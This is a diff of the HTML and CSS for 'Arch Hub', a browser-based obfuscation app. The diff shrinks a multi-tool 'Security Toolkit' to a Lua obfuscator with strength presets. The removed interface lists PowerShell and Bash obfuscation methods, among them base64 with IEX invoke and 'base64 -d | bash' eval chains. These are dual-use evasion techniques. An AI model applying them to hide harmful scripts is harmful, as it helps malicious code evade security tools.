-/* ── SCAN-LINE OVERLAY ── */
-.shell::before {
-  content: ''; position: fixed; inset: 0;
-  background-image: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px);
-  pointer-events: none; z-index: 999;
-}
-
-/* ══════ AUTH SCREEN ══════ */
-.auth-screen {
-  position: fixed; inset: 0; background: var(--bg-0);
-  display: flex; align-items: center; justify-content: center;
-  z-index: 1000; padding: 20px; overflow-y: auto;
-  background-image:
-    radial-gradient(circle at 15% 20%, rgba(110,86,207,0.12), transparent 45%),
-    radial-gradient(circle at 85% 80%, rgba(45,212,191,0.07), transparent 45%);
-}
-.auth-screen.hidden { display: none; }
-.auth-screen::before, .auth-screen::after {
-  content: ''; position: fixed; border-radius: 50%;
-  filter: blur(80px); pointer-events: none;
-  animation: floatGlow 8s ease-in-out infinite alternate;
-}
-.auth-screen::before { width: 400px; height: 400px; background: rgba(110,86,207,0.08); top: -100px; left: -100px; }
-.auth-screen::after { width: 300px; height: 300px; background: rgba(45,212,191,0.06); bottom: -80px; right: -80px; animation-direction: alternate-reverse; }
-@keyframes floatGlow { from { transform: translate(0,0) scale(1); } to { transform: translate(30px,20px) scale(1.1); } }
-
-.auth-card {
-  width: 100%; max-width: 400px;
-  background: rgba(13,18,32,0.75);
-  border: 1px solid var(--border); border-radius: 12px;
-  padding: 32px 28px 24px;
-  box-shadow: 0 24px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(110,86,207,0.08);
-  backdrop-filter: blur(20px) saturate(1.6);
-  -webkit-backdrop-filter: blur(20px) saturate(1.6);
-  animation: authIn 0.25s ease;
-}
-@keyframes authIn { from { opacity:0; transform:translateY(10px) scale(0.99); } to { opacity:1; transform:translateY(0) scale(1); } }
-
-.auth-logo {
-  display: flex; align-items: center; justify-content: center; gap: 10px;
-  font-family: var(--mono); font-size: 20px; font-weight: 600;
-  letter-spacing: -0.01em; color: var(--text-0); margin-bottom: 6px;
-}
-.auth-logo-icon { width: 28px; height: 28px; flex-shrink: 0; }
-.auth-logo-icon svg { width: 100%; height: 100%; }
-.auth-tagline {
-  text-align: center; font-size: 10px; color: var(--text-3);
-  letter-spacing: 0.14em; text-transform: uppercase;
-  font-family: var(--mono); margin-bottom: 26px;
-}
-.auth-tabs {
-  display: flex; gap: 4px; background: var(--bg-2); padding: 4px;
-  border-radius: 8px; margin-bottom: 22px; border: 1px solid var(--border);
-}
-.auth-tab {
-  flex: 1; padding: 8px; background: transparent; border: none;
-  color: var(--text-2); font-family: var(--sans); font-size: 13px;
-  font-weight: 500; cursor: pointer; border-radius: 5px; transition: all 0.15s;
-}
-.auth-tab:hover { color: var(--text-1); }
-.auth-tab.active { background: var(--bg-4); color: var(--text-0); }
-.form-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; }
-.form-group label {
-  font-size: 10px; font-weight: 600; color: var(--text-2);
-  font-family: var(--mono); letter-spacing: 0.08em; text-transform: uppercase;
-}
-.form-group input {
-  width: 100%; padding: 10px 12px; background: var(--bg-0);
-  border: 1px solid var(--border); border-radius: 6px; color: var(--text-0);
-  font-family: var(--sans); font-size: 13px; outline: none;
-  transition: border-color 0.15s, box-shadow 0.15s;
-}
-.form-group input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
-.form-group input::placeholder { color: var(--text-3); }
-.auth-error { min-height: 16px; font-size: 11.5px; color: #f87171; font-family: var(--mono); margin-bottom: 10px; line-height: 1.4; }
-.auth-error.ok { color: #4ade80; }
-.auth-submit { width: 100%; justify-content: center; padding: 11px; font-size: 13px; font-weight: 600; }
-.btn-google {
-  background: #ffffff; color: #333333; width: 100%;
-  justify-content: center; padding: 11px; font-size: 13px; font-weight: 600; gap: 10px;
-}
-.btn-google:hover { background: #f1f1f1; }
-.auth-note {
-  margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border);
-  font-size: 10px; color: var(--text-3); text-align: center;
-  font-family: var(--mono); line-height: 1.7;
-}
-.auth-note strong { color: var(--text-2); font-weight: 500; }
-
-/* ══════ COMMAND PALETTE ══════ */
-.cmd-overlay {
-  display: none; position: fixed; inset: 0;
-  background: rgba(0,0,0,.55); z-index: 2000;
-  backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
-  align-items: flex-start; justify-content: center;
-  padding-top: 15vh;
-}
-.cmd-overlay.open { display: flex; }
-.cmd-box {
-  width: 100%; max-width: 480px;
-  background: var(--bg-1); border: 1px solid var(--border-hi);
-  border-radius: 10px; overflow: hidden;
-  box-shadow: 0 24px 80px rgba(0,0,0,.6);
-}
-.cmd-input-wrap {
-  display: flex; align-items: center; gap: 10px;
-  padding: 12px 16px; border-bottom: 1px solid var(--border);
-}
-.cmd-input-wrap svg { flex-shrink: 0; color: var(--text-3); width: 16px; height: 16px; }
-#cmd-search {
-  flex: 1; background: none; border: none; outline: none;
-  font-family: var(--sans); font-size: 15px; color: var(--text-0);
-  caret-color: var(--accent-hi);
-}
-#cmd-search::placeholder { color: var(--text-3); }
-.cmd-hint { font-family: var(--mono); font-size: 10px; color: var(--text-3); }
-.cmd-results { max-height: 320px; overflow-y: auto; padding: 6px; }
-.cmd-item {
-  display: flex; align-items: center; gap: 10px;
-  padding: 9px 12px; border-radius: 6px; cursor: pointer;
-  color: var(--text-1); font-size: 13px; transition: background .1s;
-}
-.cmd-item:hover, .cmd-item.selected { background: var(--bg-3); color: var(--text-0); }
-.cmd-item-cat {
-  margin-left: auto; font-family: var(--mono); font-size: 10px;
-  color: var(--text-3); text-transform: uppercase; letter-spacing: .06em;
-}
-.cmd-empty { padding: 20px; text-align: center; color: var(--text-3); font-size: 13px; }
-
-/* ══════ PRODUCTION FALLBACKS ══════ */
-:root { color-scheme: dark; }
-
-input:-webkit-autofill,
-input:-webkit-autofill:hover,
-input:-webkit-autofill:focus {
-  -webkit-text-fill-color: var(--text-0);
-  -webkit-box-shadow: 0 0 0 1000px var(--bg-0) inset;
-  caret-color: var(--text-0);
-  transition: background-color 9999s ease-in-out 0s;
-}
-
-html, body, .shell { height: 100dvh; }
-
-::selection { background: rgba(110,86,207,.45); color: #fff; }
-::placeholder { color: var(--text-3); opacity: 1; }
-:focus-visible { outline: 2px solid var(--accent-hi); outline-offset: 2px; }
-textarea:focus-visible, input:focus-visible, select:focus-visible { outline: none; }
-
-@media (prefers-reduced-motion: reduce) {
-  *, *::before, *::after {
-    animation-duration: .01ms !important;
-    transition-duration: .01ms !important;
-    animation-iteration-count: 1 !important;
-  }
-}
-
-@supports not (backdrop-filter: blur(1px)) {
-  .card { background: var(--bg-1); }
-}
-
-/* ══════ MOBILE NAV ══════ */
-@media (max-width: 700px) {
-  .shell {
-    grid-template-columns: 1fr;
-    grid-template-rows: 48px auto 1fr;
-  }
-  .sidebar {
-    display: flex !important;
-    flex-direction: row;
-    overflow-x: auto;
-    overflow-y: hidden;
-    padding: 6px 10px;
-    gap: 4px;
-    border-right: none;
-    border-bottom: 1px solid var(--border);
-    scrollbar-width: none;
-    max-height: 48px;
-  }
-  .sidebar::-webkit-scrollbar { display: none; }
-  .nav-section,
-  .sidebar-footer,
-  .nav-dot { display: none !important; }
-  .nav-item {
-    flex: 0 0 auto;
-    padding: 5px 11px;
-    border-left: none;
-    border-radius: 20px;
-    white-space: nowrap;
-    font-size: 12px;
-    margin-right: 0;
-    transform: none !important;
-    box-shadow: none;
-  }
-  .nav-item.active {
-    background: var(--bg-4);
-    box-shadow: 0 0 0 1px var(--accent) !important;
-    color: var(--accent-hi);
-  }
-  .main { padding: 16px 12px; padding-bottom: calc(32px + env(safe-area-inset-bottom, 0px)); }
-  .topbar { padding: 0 12px; gap: 8px; }
-  .logo-sub, .logo-sep, .topbar-badge { display: none; }
-  input, textarea, select, .form-group input { font-size: 16px; }
-  .topbar { padding-top: env(safe-area-inset-top, 0px); height: calc(48px + env(safe-area-inset-top, 0px)); }
-}
-
-@keyframes noticeIn {
-  from { opacity: 0; transform: translateY(-6px); }
-  to   { opacity: 1; transform: translateY(0); }
-}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms !important;transition-duration:.01ms !important;animation-iteration-count:1 !important}}
+@supports not (backdrop-filter:blur(1px)){.card{background:var(--bg-1)}}
 </style>
 </head>
 <body>
 
-<!-- AUTH SCREEN -->
+<!-- AUTH -->
 <div class="auth-screen" id="auth-screen">
   <div class="auth-card">
     <div class="auth-logo">
-      <div class="auth-logo-icon">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity="0.9"/>
-          <path d="M2 17l10 5 10-5" stroke="#9b82f3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M2 12l10 5 10-5" stroke="#6e56cf" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-      </div>
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity=".9"/>
+        <path d="M2 17l10 5 10-5" stroke="#9b82f3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M2 12l10 5 10-5" stroke="#6e56cf" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
       Arch Hub
     </div>
-    <div class="auth-tagline">Security Toolkit</div>
+    <div class="auth-tagline">Lua Obfuscator</div>
     <div class="auth-tabs">
       <button class="auth-tab active" data-tab="login" onclick="switchAuthTab('login')">Sign In</button>
       <button class="auth-tab" data-tab="register" onclick="switchAuthTab('register')">Register</button>
     </div>
-    <form id="login-form" class="auth-form" onsubmit="handleLogin(event)">
+    <form id="login-form" onsubmit="handleLogin(event)">
       <div class="form-group">
-        <label for="login-user">Username</label>
-        <input type="text" id="login-user" placeholder="Enter your username" autocomplete="username" required>
+        <label>Username</label>
+        <input type="text" id="login-user" placeholder="Enter username" autocomplete="username" required>
       </div>
       <div class="form-group">
-        <label for="login-pass">Password</label>
-        <input type="password" id="login-pass" placeholder="Enter your password" autocomplete="current-password" required>
+        <label>Password</label>
+        <input type="password" id="login-pass" placeholder="Enter password" autocomplete="current-password" required>
       </div>
       <div class="auth-error" id="login-error"></div>
       <button type="submit" class="btn btn-primary auth-submit">Sign In</button>
     </form>
-    <div id="register-form" class="auth-form" style="display:none;">
-      <div style="text-align:center;margin-bottom:24px;">
-        <div style="font-size:14px;font-weight:600;color:var(--text-0);margin-bottom:8px;">Create your account</div>
-        <div style="font-size:12px;color:var(--text-2);">To continue to Arch Hub, please authorize with your Google account.</div>
+    <div id="register-form" style="display:none">
+      <div style="text-align:center;margin-bottom:24px">
+        <div style="font-size:14px;font-weight:600;color:var(--text-0);margin-bottom:8px">Create account</div>
+        <div style="font-size:12px;color:var(--text-2)">Authorize with your Google account to continue.</div>
       </div>
-      <button type="button" class="btn btn-google" onclick="handleGoogleLogin()">
+      <button class="btn btn-google" onclick="handleGoogleLogin()">
         <svg width="18" height="18" viewBox="0 0 48 48">
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
@@ -637,1537 +269,860 @@ textarea:focus-visible, input:focus-visible, select:focus-visible { outline: non
         </svg>
         Continue with Google
       </button>
-      <div class="auth-error" id="reg-error" style="margin-top:14px;text-align:center;"></div>
+      <div class="auth-error" id="reg-error" style="margin-top:14px;text-align:center"></div>
     </div>
-    <div class="auth-note">
-      <strong>Client-side authentication</strong><br>
-      Credentials are stored locally in this browser.
-    </div>
-  </div>
-</div>
-
-<!-- COMMAND PALETTE -->
-<div class="cmd-overlay" id="cmd-overlay" onclick="cmdClose(event)">
-  <div class="cmd-box">
-    <div class="cmd-input-wrap">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
-      </svg>
-      <input id="cmd-search" placeholder="Search tools…" autocomplete="off" oninput="cmdFilter()" onkeydown="cmdKey(event)">
-      <span class="cmd-hint">ESC to close</span>
-    </div>
-    <div class="cmd-results" id="cmd-results"></div>
+    <div class="auth-note"><strong>Client-side only</strong><br>Credentials stored locally. All obfuscation runs in your browser.</div>
   </div>
 </div>
 
 <!-- APP SHELL -->
-<div class="shell" id="app-shell" style="display:none;">
-
-<header class="topbar">
-  <div class="logo" onclick="navigate('home')">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity="0.9"/>
+<div class="shell" id="app-shell" style="display:none">
+  <header class="topbar">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity=".9"/>
         <path d="M2 17l10 5 10-5" stroke="#9b82f3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
         <path d="M2 12l10 5 10-5" stroke="#6e56cf" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
+      Arch Hub
+      <div class="logo-sep"></div>
+      <span class="logo-sub">Lua Obfuscator</span>
     </div>
-    Arch Hub
-    <div class="logo-sep"></div>
-    <span class="logo-sub">Security Toolkit</span>
-  </div>
-  <div class="topbar-spacer"></div>
-  <button class="btn btn-ghost" onclick="cmdOpen()" title="Ctrl+K" style="font-family:var(--mono);font-size:11px;gap:6px;border-color:var(--border);">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-      <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
-    </svg>
-    <span>⌘K</span>
-  </button>
-  <div class="topbar-user" id="topbar-user">
-    <div class="user-avatar" id="user-avatar">?</div>
-    <span class="user-name" id="user-name">—</span>
-    <span class="user-role" id="user-role">USER</span>
-    <button class="btn btn-ghost" onclick="logout()">Sign out</button>
-  </div>
-  <div class="topbar-badge">v2.5.0</div>
-</header>
+    <div class="topbar-spacer"></div>
+    <div class="topbar-user" id="topbar-user">
+      <div class="user-avatar" id="user-avatar">?</div>
+      <span class="user-name" id="user-name">—</span>
+      <span class="user-role" id="user-role">USER</span>
+      <button class="btn btn-ghost" onclick="logout()">Sign out</button>
+    </div>
+    <div class="topbar-badge">v3.0.0</div>
+  </header>
 
-<nav class="sidebar">
-  <div class="nav-section">Overview</div>
-  <div class="nav-item active" onclick="navigate('home')"><div class="nav-dot"></div> Dashboard</div>
-  <div class="nav-section">Obfuscators</div>
-  <div class="nav-item" onclick="navigate('js-obf')"><div class="nav-dot"></div> JavaScript</div>
-  <div class="nav-item" onclick="navigate('ps-obf')"><div class="nav-dot"></div> PowerShell</div>
-  <div class="nav-item" onclick="navigate('bash-obf')"><div class="nav-dot"></div> Bash / Shell</div>
-  <div class="nav-item" onclick="navigate('lua-obf')"><div class="nav-dot"></div> Lua</div>
-  <div class="nav-section">Encode / Decode</div>
-  <div class="nav-item" onclick="navigate('base64')"><div class="nav-dot"></div> Base64</div>
-  <div class="nav-item" onclick="navigate('url-enc')"><div class="nav-dot"></div> URL Encode</div>
-  <div class="nav-item" onclick="navigate('hex-enc')"><div class="nav-dot"></div> Hex</div>
-  <div class="nav-item" onclick="navigate('html-enc')"><div class="nav-dot"></div> HTML Entity</div>
-  <div class="nav-section">Ciphers</div>
-  <div class="nav-item" onclick="navigate('xor')"><div class="nav-dot"></div> XOR Cipher</div>
-  <div class="nav-item" onclick="navigate('rot')"><div class="nav-dot"></div> ROT13 / ROT-N</div>
-  <div class="nav-item" onclick="navigate('caesar')"><div class="nav-dot"></div> Caesar Cipher</div>
-  <div class="nav-section">Hashing</div>
-  <div class="nav-item" onclick="navigate('hash')"><div class="nav-dot"></div> Hash Generator</div>
-  <div class="nav-section">Utilities</div>
-  <div class="nav-item" onclick="navigate('string-tools')"><div class="nav-dot"></div> String Tools</div>
-  <div class="nav-item" onclick="navigate('charcode')"><div class="nav-dot"></div> Char Code</div>
-  <div class="nav-item" onclick="navigate('diff')"><div class="nav-dot"></div> Text Diff</div>
-  <div class="nav-item" onclick="navigate('regex')"><div class="nav-dot"></div> Regex Tester</div>
-  <div class="sidebar-footer">
-    <div class="sidebar-footer-text">All processing<br>runs client-side.</div>
-  </div>
-</nav>
+  <main class="main">
+    <!-- HEADER -->
+    <div class="panel-header">
+      <div class="panel-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/>
+        </svg>
+      </div>
+      <div>
+        <div class="panel-title">Lua Obfuscator</div>
+        <div class="panel-desc">Multi-stage pipeline — variable rename · string byte-encoding · number obfuscation · junk injection · control flow · loadstring wrapping · double-pack. All processing is client-side.</div>
+      </div>
+    </div>
 
-<main class="main" id="main-area">
+    <!-- PRESETS + STRENGTH -->
+    <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap">
+      <div class="presets">
+        <button class="preset-btn" onclick="applyPreset('off')">Off</button>
+        <button class="preset-btn active" id="preset-light" onclick="applyPreset('light')">Light</button>
+        <button class="preset-btn" id="preset-strong" onclick="applyPreset('strong')">Strong</button>
+        <button class="preset-btn" id="preset-nuclear" onclick="applyPreset('nuclear')">☢ Nuclear</button>
+      </div>
+      <div class="strength-meter" style="flex:1;min-width:160px">
+        <div class="strength-bar"><div class="strength-fill" id="strength-fill" style="width:30%;background:var(--ok)"></div></div>
+        <div class="strength-label" id="strength-label">Light</div>
+      </div>
+    </div>
 
-<!-- DASHBOARD -->
-<div class="tool-panel active" id="home-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
-        <rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
-      </svg>
+    <!-- INPUT -->
+    <div class="card">
+      <div class="card-head">
+        <span class="card-label">Input — Lua source</span>
+        <div class="card-actions">
+          <button class="btn btn-ghost" onclick="document.getElementById('lua-in').value='';document.getElementById('lua-out').value=''">Clear</button>
+          <button class="btn btn-ghost" onclick="loadSample()">Sample</button>
+        </div>
+      </div>
+      <div class="card-body">
+        <textarea id="lua-in" placeholder="-- Paste Lua source here..." spellcheck="false"></textarea>
+      </div>
     </div>
-    <div>
-      <div class="panel-title">Arch Hub</div>
-      <div class="panel-desc">Client-side security toolkit — obfuscation, encoding, ciphers, and hashing. Nothing leaves your browser.</div>
-    </div>
-  </div>
-  <div class="dash-grid" id="dash-grid"></div>
-</div>
 
-<!-- JS OBFUSCATOR -->
-<div class="tool-panel" id="js-obf-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/>
-        <polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">JavaScript Obfuscator</div>
-      <div class="panel-desc">Variable renaming · string hex encoding · control flow mangling · dead code injection</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Input — JavaScript source</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="clearField('js-in','js-out')">Clear</button>
-        <button class="btn btn-ghost" onclick="loadSample('js-in', jsSample)">Sample</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="js-in" placeholder="// Paste JavaScript here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Options</span></div>
-    <div class="card-body">
-      <div class="opts" id="js-opts">
-        <div class="opt-item checked" data-key="renameVars" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Rename variables</span></div>
-        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (hex)</span></div>
-        <div class="opt-item checked" data-key="hexLiterals" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Hex number literals</span></div>
-        <div class="opt-item" data-key="selfDefend" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Self-defending wrapper</span></div>
-        <div class="opt-item" data-key="deadCode" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Dead code injection</span></div>
-        <div class="opt-item" data-key="controlFlow" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Control flow flatten</span></div>
-      </div>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="obfuscateJS()">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-      Obfuscate
-    </button>
-    <button class="btn btn-secondary" onclick="copyOutput('js-out')">Copy output</button>
-  </div>
-  <div class="notice" id="js-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output — obfuscated</span>
-      <div class="card-actions">
-        <div class="stat-chip" id="js-stats" style="display:none"><span id="js-ratio">—</span> ratio</div>
-        <button class="btn btn-ghost" onclick="downloadText('js-out','obfuscated.js')">↓ Download</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="js-out" placeholder="// Output appears here..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
+    <!-- OPTIONS -->
+    <div class="card">
+      <div class="card-head"><span class="card-label">Pipeline options</span></div>
+      <div class="card-body" style="display:flex;flex-direction:column;gap:16px">
 
-<!-- POWERSHELL OBFUSCATOR -->
-<div class="tool-panel" id="ps-obf-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/>
-        <path d="M7 8l3 2-3 2m5 0h3"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">PowerShell Obfuscator</div>
-      <div class="panel-desc">Tick insertion · char-array substitution · base64 encoding (UTF-16LE) · case randomisation</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Input — PowerShell</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="clearField('ps-in','ps-out')">Clear</button>
-        <button class="btn btn-ghost" onclick="loadSample('ps-in', psSample)">Sample</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="ps-in" placeholder="# Paste PowerShell script here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Technique</span></div>
-    <div class="card-body">
-      <div class="col">
-        <label class="label">Method</label>
-        <select id="ps-method">
-          <option value="tick">Tick insertion (backtick junk)</option>
-          <option value="char">Char array ([char]0x49+[char]0x45+…)</option>
-          <option value="b64">Base64 encode + invoke (UTF-16LE, IEX)</option>
-          <option value="caserand">Case randomisation</option>
-          <option value="combo">Combo (tick + case + string split)</option>
-        </select>
-      </div>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="obfuscatePS()">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-      Obfuscate
-    </button>
-    <button class="btn btn-secondary" onclick="copyOutput('ps-out')">Copy output</button>
-  </div>
-  <div class="notice" id="ps-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output — obfuscated</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="downloadText('ps-out','obfuscated.ps1')">↓ Download</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="ps-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
+        <div>
+          <div class="section-label" style="margin-bottom:10px">Syntax</div>
+          <div class="opts">
+            <div class="opt-item checked" data-key="stripComments" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Strip comments</div><div class="opt-desc">Remove -- and --[[ ... ]]</div></div>
+            </div>
+            <div class="opt-item checked" data-key="minify" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Minify whitespace</div><div class="opt-desc">Collapse spaces &amp; newlines</div></div>
+            </div>
+          </div>
+        </div>
 
-<!-- BASH OBFUSCATOR -->
-<div class="tool-panel" id="bash-obf-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M4 17l6-6-6-6"/><path d="M12 19h8"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Bash / Shell Obfuscator</div>
-      <div class="panel-desc">Hex eval wrapping · variable substitution · IFS splitting · base64 eval chain</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Input — shell script</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="clearField('bash-in','bash-out')">Clear</button>
-        <button class="btn btn-ghost" onclick="loadSample('bash-in', bashSample)">Sample</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="bash-in" placeholder="#!/bin/bash&#10;# Paste script here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Method</span></div>
-    <div class="card-body">
-      <div class="col">
-        <select id="bash-method">
-          <option value="b64">Base64 eval (echo … | base64 -d | bash)</option>
-          <option value="hex">Hex octal substitution</option>
-          <option value="varsplit">Variable fragmentation</option>
-          <option value="ifs">IFS command splitting</option>
-        </select>
-      </div>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="obfuscateBash()">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-      Obfuscate
-    </button>
-    <button class="btn btn-secondary" onclick="copyOutput('bash-out')">Copy output</button>
-  </div>
-  <div class="notice" id="bash-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output — obfuscated</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="downloadText('bash-out','obfuscated.sh')">↓ Download</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="bash-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
+        <div>
+          <div class="section-label" style="margin-bottom:10px">Variables &amp; Identifiers</div>
+          <div class="opts">
+            <div class="opt-item checked" data-key="renameLocals" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Rename locals</div><div class="opt-desc">local x → _0x0001</div></div>
+            </div>
+            <div class="opt-item checked" data-key="renameParams" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Rename parameters</div><div class="opt-desc">function(a,b) → function(_0x,_0x)</div></div>
+            </div>
+            <div class="opt-item" data-key="renameGlobals" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Mangle globals</div><div class="opt-desc">Wrap _G refs via table proxy</div></div>
+            </div>
+          </div>
+          <div style="margin-top:10px">
+            <div class="row" style="gap:10px;align-items:flex-end">
+              <div class="col">
+                <label class="label">Name style</label>
+                <select id="name-style">
+                  <option value="hex">Hex counter (_0x0001, _0x0002 …)</option>
+                  <option value="chaos">Chaos (IlIOlI1lO …)</option>
+                  <option value="rand">Random hex (_a3f2c1 …)</option>
+                </select>
+              </div>
+              <div class="col">
+                <label class="label">Passes</label>
+                <select id="rename-passes">
+                  <option value="1">1 pass</option>
+                  <option value="2">2 passes</option>
+                  <option value="3">3 passes</option>
+                </select>
+              </div>
+            </div>
+          </div>
+        </div>
 
-<!-- LUA OBFUSCATOR -->
-<div class="tool-panel" id="lua-obf-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Lua Obfuscator</div>
-      <div class="panel-desc">Local rename · comment strip · decimal byte-encode (UTF-8) · hex literals · minify · loadstring wrapper</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Input — Lua source</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="clearField('lua-in','lua-out')">Clear</button>
-        <button class="btn btn-ghost" onclick="loadSample('lua-in', luaSample)">Sample</button>
-      </div>
-    </div>
